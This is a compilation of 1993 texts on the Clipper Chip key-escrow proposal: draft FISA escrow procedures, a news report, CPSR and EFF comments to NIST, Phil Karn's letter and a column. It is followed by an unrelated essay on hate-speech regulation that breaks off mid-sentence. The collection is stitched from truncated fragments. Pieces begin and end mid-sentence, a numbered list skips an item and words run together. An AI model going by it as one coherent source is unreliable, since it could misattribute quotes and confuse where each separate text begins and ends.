with a key-escrow encryption method.These procedures cover all electronic surveillance conductedpursuant to the Foreign Intelligence Surveillance Act (FISA),Pub. L. 9S-511, which appears at Title 50, U.S. Code, Section1801 et seq. 1) In each case there shall be a legal authorization forthe interception of wire and/or electroniccommunications. 2) In the event that federal authorities discover duringthe course of any lawfully authorized interception thatcommunications encrypted with a key-escrow encryptionmethod are being utilized, they may obtain acertification from an agency authorized to participatein the conduct of the interception, or from theAttorney General of the United States or designeethereof. Such certification shall (a) identify the agency participating in the conduct ofthe interception and the person providing thecertification;(b) certify that necessary legal authorization has beenobtained to conduct electronic surveillance regardingthese communications;(c) specify the termination date of the period forwhich interception has been authorized;(d) identify by docket number or other suitable methodof specification the source of the authorization;(e) certify that communications covered by thatauthorization are being encrypted with a key-escrowencryption method;(f) specify the identifier (ID) number of the keyescrow encryption chip providing such encryption; and(g) specify the serial (ID) number of the key-escrowdecryption device that will be used by the agencyparticipating in the conduct of the interception fordecryption of the intercepted communications. 4) This certification shall be submitted to each of thedesignated key component escrow agents. If thecertification has been provided by an agency authorizedto participate in the conduct of the interception, assoon thereafter as practicable, an attorney associatedwith the Department of Justice, office of IntelligencePolicy and Review, shall provide each of the keycomponent escrow agents with written confirmation ofthe certification. 5) Upon receiving the certification, each key componentescrow agent shall release the necessary key component tothe agency participating in the conduct of theinterception. The key components shall be provided in amanner that assures they cannot be used other than inconjunction with the lawfully authorized electronicsurveillance for which they were requested. 6) Each of the key component escrow agents shall retain acopy of the certification, as well as the subsequentwritten confirmation of the Department of Justice, Officeof Intelligence Policy and Review. 7) Upon, or prior to, completion of the electronicsurveillance phase of the investigation, the ability ofthe agency participating in the conduct of theinterception to decrypt intercepted communications shallterminate, and such agency may not retain the keycomponents.

Under the clipper plan announced this year by the Clinton White House,police agencies that receive court authorization for a wiretap to interceptencrypted communications would then need the technological cooperation of twoindependent "escrow" agents to crack the code. Earlier this week administration officials told congressional staff membersthat the two escrow agents will be officials of two government agencies: theCommerce Department's National Institute of Standards and Technology (NIST), anda non-law enforcement section of the Treasury Department that has not beenselected. Yesterday industry and civil-liberties groups criticized that selectionbecause they said NIST and Treasury are not independent, but arms of the samefederal government that could some day be called upon to listen in on theircommunications. Douglas Miller, government affairs representative of the Software PublishersAssociation, made up of U.S. software firms, said his group has "grave doubts"that foreign corporations will encrypt their communications with the clipperchip because "the U.S. government holds the key." A main reason the administration is promoting clipper is that the U.S.National Security Agency, the super-secret code-breaking agency, wants todiscourage use of highly capable, non- clipper encryption programs that arebecoming increasingly popular but that the NSA can't pierce. Industry officials for years have regarded NIST as a stalking horse for theNSA. Jerry Berman, director of the Washington office of the Electronic FrontierFoundation, which promotes public-interest causes in technology-policy areas,said NIST is "so close to the NSA that it can't give the public comfort thatthis is a true escrow system." John Podesta, assistant to the president and a key White House staff memberon this issue, said such objections are "a phony issue." "We clearly are looking for procedures and escrow agents that would maintainprivacy and confidentiality and security of the keys," Podesta said."Cryptography lends itself to a certain degree of paranoia." Kate Martin, director of the Center for National Security Studies of theAmerican Civil Liberties Union, mocked use of the term "escrow" in this case. Anescrow agent is someone who is independent of two parties potentially inconflict, like a settlement attorney at a real estate closing, she said. "As long as the escrow agents are government agencies, it's misleading tocall them that," she said. "The government doesn't have a fiduciary obligationto the people whose [communications] keys it holds," but only to the government. "The whole idea continues to be structurally flawed," said Bruce Heiman,attorney for the Business Software Alliance, a group of top U.S. software firms,such as Microsoft, Novell, Lotus and Apple. Companies and individuals whotransmit secure information "will have serious doubts about the integrity of thesystem." Since the government currently prevents the export of many powerful U.S.-madeencryption techniques, the administration's attempts to promote its clipperchip "will discourage use of encryption, period, or hand over the market forencryption to foreigners." When one listens to an encrypted conversation, it sounds like a crackle orbuzz. Under the plan, every law-enforcement agency will have a special personalcomputer or "black box" to descramble that crackle, but the device will workonly when they have been given a special key from the escrow agents. When police get a judge's permission to intercept an encrypted conversationor stream of computerized data, they would use the box to determine the specialencryption identifier or label assigned to that particular encryption device. A detective would notify NIST and Treasury that he or she has permission tolisten in on the party. NIST and Treasury would have a list of the secretencryption key numbers -- extremely long lists of 0s and 1s -- for everyencryption device sold in the United States. NIST and Treasury would find theappropriate one on the list, and then they would send the needed key number tothe police over telephone lines. The police would then insert that decodernumber into the black box to tap the phone line in question. The ACLU's Martin said the government, given lists of secret encryptionnumbers, "has an enormously greater ability to eavesdrop than it's ever had."Government officials deny that.

Sobel)Subject: NIST Explains Clipper "Review"Date: 23 Sep 93 20:52:00 GMT The National Institute of Standards and Technology (NIST) hasclarified the role of five experts selected by the agency toevaluate the government's Clipper Chip proposal and the underlyingSKIPJACK cryptographic algorithm. In a recent letter to the CPSRWashington Office, NIST asserts that the panel was not establishedto provide "advice or recommendations" to the government. Rather,according to NIST, the reason for convening the group was "toprovide the opportunity for independent experts to satisfythemselves as to the strength and effectiveness of the algorithmin order to encourage widespread acceptance of it in themarketplace." NIST concludes that the panel's evaluationtherefore falls outside the scope of the Federal AdvisoryCommittee Act, which opens the work of advisory panels to publicscrutiny. In response to CPSR's request for documents relevant to thepanel's review, the agency reveals that NIST has no records which were made available to or prepared for the five experts for the purpose of enabling them to evaluate the Clipper Chip proposal. Any such records would be in the possession of the National Security Agency, where all activities related to the work of the experts were conducted. This disclosure provides further confirmation that NSA, and notNIST, is the driving force behind the Clipper proposal, despiteNIST's public role as the "proposing" agency. The only NIST document released to CPSR is a copy of theinvitation sent to the five experts who participated in theevaluation. That letter describes the "key escrow" system andstates that the escrowed keys will be made available "only toauthorized government officials under proper legal authorizations,usually a court order." This language -- "usually a court order"-- suggests that there will be instances in which the escrow keyswill be provided to government agents without presentation of ajudicial warrant. The government has never clearly defined whatwill constitute "legal authorization" under the Clipper system. David L.

We have added a sample letter and additional information at the end of theCPSR post. text of CPSR post follows Call for Clipper Comments The National Institute of Standards and Technology (NIST) hasissued a request for public comments on its proposal to establishthe "Skipjack" key-escrow system as a Federal InformationProcessing Standard (FIPS). The deadline for the submission ofcomments is September 28, 1993. The full text of the NIST noticefollows. CPSR is urging all interested individuals and organizations toexpress their views on the proposal and to submit commentsdirectly to NIST. Comments need not be lengthy or very detailed;all thoughtful statements addressing a particular concern willlikely contribute to NIST's evaluation of the key-escrow proposal. The following points could be raised about the NIST proposal(additional materials on Clipper and the key escrow proposal maybe found at the CPSR ftp site, cpsr.org): The potential risks of the proposal have not been assessed andmany questions about the implementation remain unanswered. TheNIST notice states that the current proposal "does not includeidentification of key escrow agents who will hold the keys for thekey escrow microcircuits or the procedures for access to thekeys." The key escrow configuration may also create a dangerousvulnerability in a communications network. The risks of misuse ofthis feature should be weighed against any perceived benefit. The classification of the Skipjack algorithm as a "nationalsecurity" matter is inappropriate for technology that will be usedprimarily in civilian and commercial applications. Classificationof technical information also limits the computing community'sability to evaluate fully the proposal and the general public'sright to know about the activities of government. The proposal was not developed in response to a public concernor a business request. It was put forward by the NationalSecurity Agency and the Federal Bureau of Investigation so thatthese two agencies could continue surveillance of electroniccommunications. It has not been established that is necessary forcrime prevention. The number of arrests resulting from wiretapshas remained essentially unchanged since the federal wiretap lawwas enacted in 1968. The NIST proposal states that the escrow agents will provide thekey components to a government agency that "properly demonstrateslegal authorization to conduct electronic surveillance ofcommunications which are encrypted." The crucial term "legalauthorization" has not been defined. The vagueness of the term"legal authorization" leaves open the possibility that court-issued warrants may not be required in some circumstances. Thisissue must be squarely addressed and clarified. Adoption of the proposed key escrow standard may have an adverseimpact upon the ability of U.S. manufacturers to marketcryptographic products abroad. It is unlikely that non-U.S. userswould purchase communication security products to which the U.S.government holds keys. Comments on the NIST proposal should be sent to: Director, Computer Systems LaboratoryATTN: Proposed FIPS for Escrowed Encryption StandardTechnology Building, Room B-154National Institute of Standards and TechnologyGaithersburg, MD 20899 Submissions must be received by September 28, 1993.

Encryption is vital for the protection of individual privacy in theInformation Age. As more and more personal information flows aroundelectronic networks, we all need strong encryption to safeguard informationfrom unwanted intrusion NIST should not be moving forward with technical standards specificationuntil critical policy decisions are made. These policy issues include: Continued Legal Use of All Forms of Encryption: When the ClintonAdministration announced the Clipper Chip, it assured the public that thiswould be a purely voluntary system. We must have legal guarantees thatClipper isn't the first step toward prohibition against un-escrowedencryption. Legal Rights of Escrow Users: If people choose to deposit theirkeys with the government or any other escrow agent, they must have somelegal recourse in the event that those keys are improperly released. Themost recent draft of the escrow procedures specifically states, however: "These procedures do not create, and are not intended to create,any substantive rights for individuals intercepted through electronicsurveillance, and noncompliance with these procedures shall not provide thebasis for any motion to suppress or other objection to the introduction ofelectronic surveillance evidence lawfully acquired." Leaving users with no recourse will discourage use of the systemand is a tacit acceptance of unscrupulous government behavior. Open Standards: People won't use encryption unless they trust it.Secret standards such as Clipper cannot be evaluated by independent expertsand do not deserve the public trust. In addition, the current proposed technical standard is incomplete. It should not be approved until futher comment on the complete proposal ispossible Operating Procedures Unclear: The full operating procedures forthe escrow agents has yet to be issued. Public comment must be sought onthe complete procedures, not just the outline presented in the draft FIPS.Even the government-selected algorithm review group has declared that itneeds more information on the escrow process. Identity of Escrow Agents: The identity of one or both of theescrow agents has not been firmly established. Algorithm Classified: Asking for comments on an algorithm that isclassified makes a mockery of citizen participation in governmentdecision-making. NIST will be involved in making many critical decisions regarding theNational Information Infrastructure. The next time NIST solicits publiccomments, it should be ready to accept reply by electronic mail in additionto paper-based media. Sincerely, <<name>><<title>>******************************Sarah L.

I was young and rural in the sixties, but myformative years were spent listening to music created by people whochased the muse down many chemical alleys. Top 40 radio blared that the government wasn't to be trusted.Dylan sang "Phone's tapped anyway," and his inflection said thatwas a bad thing. But even as I was sucking up the culture, myskeptical side said that all the "Tin soldiers and Nixon'scoming..." stuff might be a little dramatic. Romanticizing livingoutside the law, coupled with the physiological effect of drugs,might be making these artists a little paranoid, a little nutty. The joke was kinda on me. Paranoid or not, John Lennon wason Nixon and FBI hate lists, the Vietnam War probably was a verybad idea, and the Watergate break-in and subsequent cover-up reallydid happen. No government is to be trusted. I could have gottena stronger lesson from the founding fathers, but they didn't haveany records out. "You say you want a revolution?"..."The governmentthat governs least governs best." Clinton is younger than any Rolling Stone (unless they replaceBill Wyman with a new bass player from his ex-wife's generation).It would seem that Bill Jefferson Clinton would share themistrust of Big Brother that we tapped our collective foot to. Butremember, he's not Bob Dylan and Neil Young - he's Kenny G andFleetwood Mac. Watch him. Willy picked up Bush's evil encryption Clipper Chip fascistfootball and ran with it ("Meet the new boss - same as the oldboss"). The Clipper Chip is supposed to give us more privacy, whichwe need. An ex-friend of mine taped Madonna talking to her businessmanager on her cordless phone, and some punk ("punk" in the prisonsense) broke into my Internet account and read my mail. The Clipper Chip, which was designed by government engineers,would be used to scramble and decode information so that only theaddressee could read it. The government would sell this chip belowmarket value (some people believe they'd be getting something fornothing; some people believe Elvis put syringes in Pepsi), and we'dall have cheap privacy. Oh, by the way ("The large print giveth,the small print taketh away"), the government would keep all thekeys so they could eavesdrop on might-be-bad-guys (with a subpoena,of course). What?! The antl-Clipper Chip people sent me megs and megs of reasonswhy the Clipper Chip sucks (the information on how it works is keptsecret, so private scientists wouldn't be able to check formistakes; trade with other countries would be difficult; how safecould the codes be kept?; and so on). Big cheese computer peopleyapped against it, and it got shot down the first time around onthe legislation front. On the tech front, there is a great cypherpunk ("punk" in therock and roll sense) alternative called Pretty Good Privacy, whichis nongovernment and free. One of my math-hip friends explainedpublic-key encryption to me, and it's pretty thinking; I'll try toexplain it in a future column. There was even talk of makingprivate encryption illegal (an evil idea, pure and simple). The more research I did, the simpler it got.

Karn, Jr Sirs: I am writing in response to your call for comments on theaforementioned matter that appeared in the Federal Register on July30, 1993. I am writing as a concerned individual with BS and MSdegrees in electrical and computer engineering and 15 years ofprofessional experience in communications, computer networking andsecurity at leading edge R&D organizations. I currently work in thedigital cellular telephone industry, a ripe application for robustencryption if there ever was one. I feel that my experience in thisfield qualifies me to comment on the practicality of the proposedstandard. First of all, I am totally opposed to the entire concept of keyescrow. It is a dangerous, un-American and fatally flawed idea thatshould never have been proposed. In my opinion, everyone has theConstitutional right to use the encryption scheme of their choice,whether or not the government can break it. The impact of strongencryption on the enforcement of legitimate laws is and will remainminimal. Even unbreakable encryption is incapable of thwartingstandard investigational techniques such as informants, testimonycompelled through grants of immunity, "end point" surveillance (e.g.,hidden microphones), the gathering of physical evidence of crimes andso forth. Strong un-escrowed encryption will, on the other hand, finally put anend to illegal, often politically motivated interceptions of privateelectronic communications without having to rely on anyone's goodwill,such as the still-unnamed "key escrow agencies". Precisely becauseeavesdropping has been so easy to do and so hard to detect, thegovernment has repeatedly proven itself untrustworthy in this regard,as documented in great detail by the Watergate investigations and theChurch Committee hearings of the 1970s. Why should we trust it now? Although the government currently claims that the EES will be a"voluntary" standard, many of its features make no sense whatsoever inthis context. For example, why must the Skipjack algorithm be keptsecret if individuals remain free to use other algorithms such astriple-key DES or IDEA that are quite probably even stronger? The government's claim is completely transparent, as one simply cannotescape the conclusion that the EES is a prelude to a ban on all otherencryption schemes, or at least a ban on those the government can'tcrack. And this presents a profoundly disturbing threat to some veryimportant Constitutional principles. Countless others have argued forcefully against the proposal on theseand other grounds. For example, see the points made by the ComputingProfessionals for Social Responsibility (CPSR) in the attachedAppendix. I fully agree with CPSR and feel that they alone should havebeen enough to stop the proposal long ago. However, the fact that the Escrowed Encryption Standard has advancedso quickly despite these serious problems reveals the totallyone-sided nature of the decision process. Far from being anindependent and impartial agency, NIST has proven itself to be merelya pawn for the National Security Agency, the Federal Bureau ofInvestigation and other powerful intelligence and law enforcementagencies. Despite (or perhaps because of) encryption's enormouspotential to put real "teeth" into the Constitutional principles ofprivacy and freedom of speech and association, these agencies arenotably unsympathetic to the widespread use of strong encryption. Bytheir very nature, these agencies are unlikely to be persuaded even bythe most profound concerns about civil liberties. Therefore, as strongly as I oppose the EES on philosophical grounds,restating these arguments here in further detail would be a waste oftime. I would instead like to dwell on one particular practicaldrawback to EES as proposed, one that renders it utterly useless forits intended purpose. The Ees Is Unacceptable Because Of Its Hardware-Only Nature Many of the potential applications for the proposed standard involvemass produced and highly miniaturized consumer electronics deviceswhere the physical space and power requirements, cost and availabilityof each of thousands of hardware components is of criticalimportance. In such products, there is a very strong preference to implement asmany functions in software as possible. There are many reasons forthis: general purpose microprocessors and memories tend to be producedin much higher volume than special purpose devices, thus providingsubstantial economies of scale; software can be upgraded more easilyin a production run or after sale than can hardware; and once written,software has essentially zero incremental costs of production. Indeed,even the incremental hardware cost of adding a particular softwarefunction is often also zero, thanks to the unused ROM, RAM and CPUcycles often found in imbedded microcomputer systems. Driving this emphasis on software are the fights marketing people anddesign engineers regularly have over the use of individual partscosting as little as a few pennies each. The smaller and lighter theproduct, the greater the price it will command in the marketplace,even if it is functionally equivalent to a larger and heavierproduct. No rational designer will add a part to do something that hecould easily do in software. In my own field, digital cellular telephony, it is clear that strongencryption using published algorithms can easily be implemented insoftware on existing microcontrollers, particularly at the low datarates involved. The MYK-78 chip, rumored to cost $90-$100 each andcapable of running at megabit rates, is enormous overkill that theextremely competitive cellular market cannot afford. It is a completenon-starter. Even if a chip like the MYK-78 were redesigned to cost substantiallyless, designers will be extremely reluctant to use highly proprietarydevices available from only a single supplier. No rationalmanufacturer will make his production line depend entirely on thehealth of a single small company, especially one such as Mykotronixwith whom so few have any prior experience. Summary The Escrowed Encryption Standard is not only fatally flawed on anynumber of Constitutional considerations, its sole reliance on hardwareimplementation makes it completely impractical and uneconomical forthe mass consumer market. It is likely that the proposal is nothingmore than a cynical attempt by federal intelligence agencies to beseen "helping" to secure civilian communications while actually doingeverything possible to thwart actual progress. However, in the hopethat NIST is sincerely interested in truly meaningful and practicalsecurity for all, I offer these comments. The present proposal should be completely abandoned. Furthermore, NISTshould advocate the complete removal of roadblocks (particularlyexport controls) that have so far effectively thwarted any realprogress by the civilian communications industry to apply widely knowncryptographic techniques to its products. Sincerely, Philip R. Karn, Jr. Appendix The following text was taken from an electronic message from ComputingProfessionals for Social Responsibility (CPSR) that was widely distributedon the Internet.

Let meknow if you think that this is an important service that EFF can providefor the online community. Below is the text of the comments that EFF filed with NIST today. ================================ September 27, 1993 National Institute for Standards and TechnologyATTN: Proposed FIPS for Escrowed Encryption StandardTechnology Building, Room B-154Gaithersburg, MD 20899 To The Director: The Electronic Frontier Foundation (EFF) writes in strongopposition to the Proposed Federal Information Processing Standard (FIPS)for an Escrowed Encryption Standard, docket # 930659-3159. We believe thatNIST's guidance in setting technical standards for security and privacyprotection is a critical part of the growth of the National InformationInfrastructure, but any action on the proposed escrow technical standardsmust await the resolution of several fundamental policy issues. Thus, atthis time, we oppose the proposed FIPS in all of its parts. Well over 200EFF members are also critical of the Proposed FIPS. We believe thisdemonstrates the depth of public concern about the implementation of keyescrow systems. EFF is a nonprofit, public interest organization whose publicpolicy mission is to ensure that the new electronic highways emerging fromthe convergence of telephone, cable, broadcast, and other communicationstechnologies enhance free speech and privacy rights and are open andaccessible to all segments of society. Introduction Widespread, affordable cryptography is vital for the protection ofindividual privacy in the Information Age. As more and more personalinformation flows around electronic networks, we all need strong encryptionto safeguard information from unwanted intrusion. Personal information,such as health care records, private communications among friends andfamilies, and personal financial transactions, will also travel over thisinformation infrastructure. The business community can only make full useof the infrastructure if it is assured that the data it transmits is securefrom unauthorized interception. In short, if communications in the newinfrastructure are vulnerable, all of our lives and businesses would besubject to both damaging and costly privacy and security losses. Resolve Policy Issues and Objectives Before Promulgating Technical Standards EFF has been in ongoing dialogue with NIST, the White House, andCongress regarding the very complex public policy choices raised bycryptography policy. We are hopeful that this dialogue will result in apositive, comprehensive set of cryptography and privacy policies. Butuntil these issues are resolved, we believe any approval of technicalstandards is premature. Among the public policy issues to be resolved arethe following: 1. Guaranteed Continued Legal Use of All Forms of Encryption When the Clinton Administration announced the Clipper Chip, itassured the public that this would be a purely voluntary system. We musthave legal guarantees that Clipper is not the first step toward prohibitionagainst un-escrowed encryption. Yet the Administration has not offered anysuch guarantees, either in the form of proposed legislation or even agencyrules. 2. Identity of Escrow Agents When Clipper was first proposed, some in the Administrationsuggested that one of the two escrow agents would be a government agencyand the other a private, non-governmental organization. Now it appearsthat plans for a private escrow agent have been dropped in favor of NISTand the Department of Treasury, though there is still no final designationof agents. We are unable to comment on the security or reliability ofescrow procedures proposed here when we do not know who will beadministering the escrow databases. We also note that there is activeconsideration of having more than two escrow agents. This option should beexplored from a policy perspective before a technical standard is adopted. 3. Legal Rights of Escrow Users If individuals do choose to deposit their keys with the government,or any other escrow agent, they must have some legal recourse in the eventthat those keys are improperly released. However, the most recent draft ofescrow procedures specifically states: "These procedures do not create, and are not intended to create, anysubstantive rights for individuals intercepted through electronicsurveillance, and noncompliance with these procedures shall not provide thebasis for any motion to suppress or other objection to the introduction ofelectronic surveillance evidence lawfully acquired." Leaving users with no recourse will discourage use of the system andprovides little disincentive against unscrupulous government behavior. In the Proposed FIPS, NIST also suggests an unusual and, webelieve, incorrect notion of what an escrow agent is. The Proposed FIPSadopts the incomplete definition of an escrow system found in Webster'sDictionary. The Proposed FIPS states: To escrow something (e.g., a document, an encryption key) means that it is"delivered to a third person to be given to the grantee only upon thefulfillment of a condition." (Webster's Seventh New CollegiateDictionary). This definition omits the very basic notion that an escrow agent hasresponsibilities to those who deposit things of value in the escrowaccount. Black's Law Dictionary, which we believe may be a moreappropriate source of information about escrow relationships, states thatan escrow contract is an: Agreement between buyer, seller, and escrow holder setting forth rights andresponsibilities of each. It is the general legal rule that one who deposits value with an escrowagent is entitled to recover damages from the escrow agent in the event ofa breach of the agent's duty of care: Depositor is entitled to recover damages sustained because of escrowagent's unwarranted act, and where grantee participates in wrongfuldelivery he also may be liable, but recovery is limited to damages actuallyattributable to wrongful delivery. Collier v Smith (Mo App) 308 SW2d 779.(See ANNOTATION: Who must bear loss resulting from defaults or peculationsof escrow holder. 15 A.L.R.2d 870.) The notion of an escrow agent who is insulated from all liability to thedepositor is wholly alien to American law and custom. The government may,of course, seek to establish escrow agents free of legal liability, butthis is fundamentally a policy choice, not a matter of technical standards. Until there is some agreement on the real responsibilities of the escrowagents, NIST is not in a position to set technical and operating standards. 4. Open, Trusted Standards: A key goal of the Clipper Proposal is to promote widespreadencryption in the marketplace. Yet people will not use encryption unlessthey trust it. Secret standards such as Clipper cannot be evaluated byindependent experts and do not deserve the public trust. Other parties,including Whitfield Diffie of Sun Microsystems, have commented extensivelyon this issue. EFF fully subscribes to those remarks. Insufficient Technical and Operating Information Available for Comments Even aside from the major policy issues left unanswered, theProposed FIPS itself lacks the detail necessary to allow full publiccomment. First, the full operating procedures for the escrow agents hasyet to be issued. Public comment must be sought on the completeprocedures, not just the outline presented in the draft FIPS. Even thegovernment-selected algorithm review group has declared that it needs moreinformation on the escrow process. Second, asking for comments on analgorithm that is classified makes a mockery of citizen participation ingovernment decision-making. Action on the Proposed FIPS Must Be Delayed to Allow Completion ofPublic-Private Consultation Mandated by Presidential Decision Directive President Clinton's announcement of the Clipper initiative madevery clear that there should be "early and frequent consultations withaffected industries, the Congress and groups that advocate the privacyrights of individuals as policy options are developed" (April 16, 1993Press Statement). EFF and other organizations have invested significanteffort in dialogue and policy review with the Administration. We have madesome progress, but many issues remain unresolved. EFF believes that forNIST to rush forward with a FIPS in advance of resolving the fundamentalpolicy issues cited above would prematurely curtail the dialogue that thePresident ordered. Finally, NIST will be involved in making many critical decisionsregarding the National Information Infrastructure. The next time NISTsolicits public comments, it should be ready to accept reply by electronicmail in addition to paper-based media. Over 200 of EFF's members e-mailedcomments to our offices, which we then printed and hand-delivered to NIST.We hope that in the near future, NIST and other federal agencies will beprepared to accept comments directly via the Internet.

The result has been the proliferation ofcampus speech codes as well as municipal statutes enhancing penaltiesfor bias crimes. No less important, however, is the opportunity that this movement hasprovided, for those outside it, to clarify and to rethink the meaningof their commitment to the freedom of expression. It is anopportunity, I must say, that we have miserably bungled. Content withsoundbites and one-liners,our deliberations on the subject have had all the heft of a talk-showmonologue. Free speech? You get what you pay for. The irony that lurks behind this debate, of course, is that the FirstAmendment may be the central article of faith in the civil religion ofAmerica, if America has a civic religion. "It's a free country," wesay, and shrug; and what we usually mean is that you can say what youplease. "Sticks and stones can break my bones," we are taught to chantas children, "but words can never hurt me." As Catharine MacKinnonwrites with some asperity in Only Words, her new book, Americans are taught this view by about the fourth grade, and continue to absorbit through osmosis from everything around them for the rest of theirlives... to the point that those who embrace it think it is their ownpersonal faith, their own original view, and trot it out likesomething learned from their own personal lives every time a problemis denominated one of "speech," whether it really fits or not. The strongest argument for regulating hate speech is the unreflectivestupidity of most of the arguments for the other side. I do not referto the debate as it has proceeded in the law reviews, where you find aquality of caution, clarity and tentativeness that has made fewinroads into the larger public discourse; the law professors who offerthe best analysis of public discourse exert very little influence onit. And this leaves us with a familiar stalemate. On the one side arethose who speak of "hate speech," a phrase that alludes to an argumentinstead of making it; and to insist on probing further is to admitthat you "just don't get it." On the other side are those who invokethe First Amendment like a mantra and seem immediately to fall into atrance, so oblivious are they to further discussion and evidence. Asmall number of anecdotes, about racism on campus or about p.c.inquisitions on campus, are endlessly recycled, and a University ofPennsylvania undergraduate named Eden Jacobowitz, of "water buffalo"fame, becomes a Dreyfus de nos jours. There is also a practical reason to worry about the impoverishment ofthe national discourse on free speech. If we keep losing thearguments, then we may slowly lose the liberties that they were meantto defend. We may come to think that the bad arguments are the onlyarguments, and when someone finally disabuses us of them, we mayswitch sides without ever considering the better arguments for stayingput. That is why, for all the pleasures of demonology, the burgeoningliterature urging the regulation of racist speech has a serious claimon our attention. Now Westview Press has conveniently collected the three most widelycited and influential papers making the case for the regulation ofracist speech. (The collection also includes a provocative essay byKimberle Williams Crenshaw about the conflicting allegiances posed byrace and gender.) Gathered together for the first time, these essays--which originally appeared in law reviews over the past several years,and were circulated more widely through the samizdat of thephotocopier--complement each other surprisingly well. Their proximityto each other casts light on their strengths and their weaknesses. The authors of these proposals are "minority" law professors who teachat mainstream institutions--Mari J. Matsuda and Charles R. LawrenceIII at Georgetown and Richard Delgado at the University of Colorado.They write vigorous and accessible prose. They are, one can fairlysay, the legal eagles of the crusade against racist hate speech. Butthey are also, as the subtitle of their collection suggests, theprincipal architects of critical race theory, which is one of the mostwidely discussed trends in the contemporary legal academy; and theirjointly written introduction to the volume serves as the clearestmanifesto that the movement has yet received. Critical race theory, we learn, owes its "social origins" to a studentboycott of a Harvard Law School course in 1981. The course was called"Race, Racism and American Law," and the university failed to accedeto student demands that it be taught by a person of color. Organizingan informal alternative course, students invited lawyers and lawprofessors of color to lecture weekly on the topic. Crenshaw was oneof the student organizers of the alternative course, Matsuda was oneof its participants and Delgado and Lawrence were among its guestlecturers. And thus was formed the nucleus of "a small but growinggroup of scholars committed to finding new ways to think about and actin pursuit of racial justice." The intellectual ancestry of the movement is more complicated, but itstwo main progenitors are the brand of feminist theory associated withMacKinnon and the radical skepticism toward traditional black-letterpieties associated with critical legal studies. Almost invariably, theliterature arguing for hate speech regulation cites MacKinnon as anauthority and a model, and takes on one or more of the traditionallegal distinctions (such as the distinction between "private" and"public") whose dismantling is a staple of critical legal studies. Soit is no surprise that conservative pundits denounce these theoristsof hate speech as faddish foes of freedom. In fact, one could moreaccurately describe their approach as neotraditional. And thoseconservatives who dream of turning the cultural clock back to the '50sshould realize that the First Amendment law of those years isprecisely what these supposedly faddish scholars wish to revive. For the conventional lay defense of free speech absolutism, and itsconcomitant attack on those who would curtail free speech, suffersfrom a bad case of historical amnesia. Just as Samuel Johnson thoughthe could refute Bishop Berkeley just by kicking a stone, the armchairabsolutists often think that they can win the debate just by adducingthe authority of the First Amendment itself. The invocation isgenerally folded together with a vague sort of historical argument.The First Amendment, we are told, has stood us in good stead throughmore than two centuries; and our greatness as a society may depend onit. The framers of the Constitution knew what they were doing, and(this is directed to those inclined to bog down in interpretativequibbles) in the end the First Amendment means what it says. The only flaw of this uplifting and well-rehearsed argument is thatit is false. Indeed, the notion that the First Amendment has been ahistorical mainstay of American liberty is an exemplary instance ofinvented tradition. To begin with, the First Amendment was notconceived as a protection of the free speech of citizens until 1931.Before then, the Court took the amendment at its word: "Congress shallmake no law...." Congress could not; but states and municipalitiescould do what they liked. And so it is no surprise that once theSupreme Court recognized freedom of expression as a right held bycitizens, the interpretation of its scope still remained quite narrow.This changed after World War II, when the Warren Court graduallyushered in a more generous vision of civil liberties. So the expansiveethic that we call the First Amendment, the eternal verity that peopleeither celebrate or bemoan, is really only a few decades old. But the hate speech movement is not content with rehearsing theweaknesses in the absolutist position. It has also aligned itself withearlier traditions of jurisprudence--here the movement's atavism ismost obvious--by showing that the sort of speech it wishes to restrictfalls into two expressive categories that the Supreme Court haspreviously held (and, the advocates of restrictions argue, correctlyheld) to be undeserving of First Amendment protection. The categoriesare those of "fighting words" and group defamation, as exemplified bycases decided in 1942 and 1952. The doctrine of "fighting words" was promulgated by the Supreme Courtin Chaplinsky v. New Hampshire (1942), in which the Court held thatthe Constitution did not protect "insulting or `fighting' words--thosethat by their very utterance inflict injury or tend to incite animmediate breach of the peace." "Such utterances are no essential partof any exposition of ideas," Justice Murphy wrote for the majority,"and are of such slight social value as a step to truth that anybenefit that may be derived from them is clearly outweighed by thesocial interest in order and morality." Those who would regulate hatespeech argue that racist abuse is a variety of, or "functionallyequivalent to," the sort of language that the Chaplinsky decisiondeclared to be unprotected; indeed, the carefully drafted speech codeadopted by Stanford University in 1990 explicitly extends only to"fighting words" or symbols, thus wearing its claim toconstitutionality on its face. If Chaplinsky can shoulder the legaland ethical burdens placed upon it, the regulationists have a powerfulweapon on their side. Can it? Probably not. To begin with, it is an open question whetherChaplinsky remains, as they say, "good law." For the Supreme Court, inthe fifty years since Chaplinsky, has never once affirmed a convictionfor uttering either "fighting words" or words that "by their veryutterance inflict injury." Indeed, in part because of this functionaldesuetude, in part because of the supposed male bias of the "breach ofthe peace" prong (men being more likely than women to throw a punch),the editors of the Harvard Law Review recently issued a call for thedoctrine's explicit interment. So much for the doctrine's judicialvalue. The young scholars at the Harvard Law Review also note, with others,that statutes prohibiting "fighting words" have had discriminatoryeffects. An apparently not atypical conviction, upheld by theLouisiana state court, was occasioned by the following exchangebetween a white police officer and the black mother of a youngsuspect. He: "Get your black ass in the goddamned car." She: "Yougoddamn mother ing police--I am going to [the superintendent of police] about this."No prize for guessing who was convicted for "fighting words." As thelegal scholar Kenneth Karst reports, "Statutes proscribing abusivewords are applied to members of racial and political minorities morefrequently than can be wholly explained by any special proclivity ofthose people to speak abusively." So much for the doctrine's politicalvalue. Even if we finally reject the appeal to Chaplinsky, the hate speechmovement can still link itself to constitutional precedent through thealternative model of group defamation. Indeed, the defamation modelis more central, more weighty, in these arguments. And note that theseare alternatives, not just different ways of describing the samething. The "fighting words" or "assaultive speech" paradigm comparesracist expression to physical assault: at its simplest, itcharacterizes an act of aggression between two individuals, victim andvictimizer. The defamation paradigm, by contrast, compares racistspeech to libel, which is an assault on dignity or reputation. Theharm is essentially social; to be defamed is to be defamed in the eyesof other people. Here the guiding precedent is Justice Frankfurter's majority opinionin the case of Beauharnais v. Illinois (1952), in which the Courtupheld a conviction under an Illinois group libel ordinance. Theordinance was clumsily written, but it essentially prohibited publicexpression that "portrays depravity, criminality, unchastity or lackof virtue in a class of citizens of any race, color, creed orreligion," thereby exposing them to "contempt, derision or obloquy."In Frankfurter's opinion: "If an utterance directed at an individualmay be the object of criminal sanctions we cannot deny to a statepower to punish the same utterance directed at a defined group," atleast as long as the restriction related to the peace and well-beingof the state. Beauharnais v. Illinois has since fallen into judicial disrepute,having been reversed in its particulars by subsequent cases like thecelebrated Sullivan v. New York Times. Indeed, more widely cited thanJustice Frankfurter's opinion is Justice Black's dissent: "If there beminority groups who hail this holding as their victory, they mightconsider the possible relevancy of this ancient remark: `Another suchvictory and I am undone.'" And yet Frankfurter's claim for 